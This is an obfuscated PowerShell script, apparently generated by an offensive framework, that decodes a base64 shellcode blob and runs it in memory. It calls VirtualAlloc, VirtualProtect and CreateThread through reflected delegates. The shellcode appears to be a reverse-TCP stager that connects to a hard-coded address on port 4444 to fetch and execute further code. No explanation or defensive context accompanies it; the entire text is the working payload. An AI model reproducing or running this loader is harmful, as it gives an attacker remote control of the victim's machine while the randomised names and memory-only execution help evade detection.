function tYRW {
        Param ($uIXj_, $pEts)
        $yb = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $yb.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yb.GetMethod('GetModuleHandle')).Invoke($null, @($uIXj_)))), $pEts))
}

function e2t8 {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $pHF,
                [Parameter(Position = 1)] [Type] $vzo1K = [Void]
        )

        $n4 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $n4.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $pHF).SetImplementationFlags('Runtime, Managed')
        $n4.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $vzo1K, $pHF).SetImplementationFlags('Runtime, Managed')

        return $n4.CreateType()
}

[Byte[]]$mK = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUE0xyUgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FBEi0AgSQHQi0gY41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcCgABGEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
[Uint32]$vnMBh = 0
$zA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tYRW kernel32.dll VirtualAlloc), (e2t8 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $mK.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($mK, 0, $zA, $mK.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tYRW kernel32.dll VirtualProtect), (e2t8 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($zA, [Uint32]$mK.Length, 0x10, [Ref]$vnMBh)) -eq $true) {
        $bVk28 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tYRW kernel32.dll CreateThread), (e2t8 @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$zA,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tYRW kernel32.dll WaitForSingleObject), (e2t8 @([IntPtr], [Int32]))).Invoke($bVk28,0xffffffff) | Out-Null
}
